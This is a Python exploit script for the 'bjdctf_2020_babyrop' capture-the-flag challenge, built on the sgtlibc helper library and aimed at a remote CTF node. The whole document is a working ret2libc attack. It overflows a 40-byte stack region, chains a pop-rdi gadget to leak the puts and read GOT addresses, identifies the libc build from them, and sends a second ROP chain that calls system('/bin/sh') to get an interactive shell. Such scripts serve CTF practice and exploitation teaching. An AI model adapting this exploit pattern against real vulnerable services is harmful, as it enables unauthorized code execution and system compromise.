import sgtlibc
from sgtlibc.gamebox import *
import sgtlibc.ROPgadgets
import os

set_config(GameBoxConfig(
    is_local=True,
    file='./bjdctf_2020_babyrop',
    remote='node4.buuoj.cn:25462',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True
))
s = sgtlibc.Searcher()
elf = client.elf
# load target and show its checksec

plt_write = elf.plt['puts']
main_addr = elf.symbols['main']
pause()

# 泄露libc
def leak(func: str):
    payload = b'a' * (32 + 8)
    payload += pc(elf.rop['rdi']) + pc(elf.got[func]) + \
        pc(plt_write) + pc(main_addr)
    sla('u story!\n', payload)
    pause()
    data = rc(6).ljust(8, b'\0')  # 32位接收4个
    data = uc(data)
    s.add_condition(func, data)
    print('leak', func, hex(data))
    return data


leak('puts')
leak('read')
data = s.dump(db_index=3)

# 再次利用payload，溢出执行system
system_addr = s.get_address(sgtlibc.s_system)
binsh_addr = s.get_address(sgtlibc.s_binsh)
log.info(f'system_addr:{hex(system_addr)}')
log.info(f'binsh_addr:{hex(binsh_addr)}')
payload = b'a' * (32 + 8)
payload += pc(elf.rop['rdi']) + pc(binsh_addr) + \
    pc(system_addr) + pc(0xdeadbeef)
sl(payload)
interactive()
